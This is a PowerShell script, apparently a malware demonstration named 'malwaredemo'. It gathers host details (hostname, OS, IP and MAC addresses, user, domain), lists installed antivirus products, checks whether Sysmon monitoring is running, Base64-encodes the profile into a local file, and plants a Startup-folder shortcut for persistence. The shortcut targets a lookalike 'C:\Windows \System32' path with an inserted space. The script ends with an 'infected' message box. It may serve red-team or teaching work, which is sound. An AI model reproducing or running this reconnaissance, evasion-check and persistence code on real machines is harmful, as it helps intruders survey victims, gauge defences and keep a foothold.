# Get system profile information
$SystemProfile = @{
    Hostname    = $env:COMPUTERNAME
    OS          = (Get-CimInstance Win32_OperatingSystem).Caption
    CPU         = (Get-CimInstance Win32_Processor).Name
    RAM         = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
    IPAddress   = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -NotLike "Loopback*" | Select-Object -ExpandProperty IPAddress) -join ", "
    MACAddress  = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -ExpandProperty MacAddress) -join ", "
    User        = $env:USERNAME
    Domain      = $env:USERDOMAIN
}

# Get installed antivirus software
$Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct" -ErrorAction SilentlyContinue | 
    Select-Object -ExpandProperty displayName -Unique

$SystemProfile["Antivirus"] = if ($Antivirus) { $Antivirus -join ", " } else { "No antivirus detected" }

# Check if Sysmon is installed and running
$SysmonService = Get-Service -Name Sysmon* -ErrorAction SilentlyContinue
$SysmonRunning = if ($SysmonService -and $SysmonService.Status -eq "Running") { "Running" } else { "Not Installed or Stopped" }

# Add Sysmon status to the profile
$SystemProfile["Sysmon_Status"] = $SysmonRunning

# Convert to JSON for structured storage
$JsonProfile = $SystemProfile | ConvertTo-Json -Depth 3

# Encode JSON output to Base64
$EncodedProfile = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($JsonProfile))

# Define output file path (same directory as the script or EXE)
$OutputFile = "$PSScriptRoot\SystemProfile.txt"

# Write Base64-encoded data to the text file
$EncodedProfile | Out-File -Encoding ascii -FilePath $OutputFile

# Define the Windows Startup folder
$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Define the target program to run (change to any legit executable)
$TargetProgram = "C:\Windows \System32\malwaredemo.ps1" # Change to any valid system file

# Define shortcut properties
$ShortcutPath = [System.IO.Path]::Combine($StartupFolder, "malwaredemo.lnk")

# Create the WScript Shell object
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)

# Set shortcut target
$Shortcut.TargetPath = $TargetProgram
$Shortcut.WorkingDirectory = "C:\Windows \System32"
$Shortcut.WindowStyle = 1
$Shortcut.Save()

# Display a harmless message box
[System.Windows.MessageBox]::Show("Your machine has been infected! Have fun figuring out how :) ", "Demo Message", 0, 64)
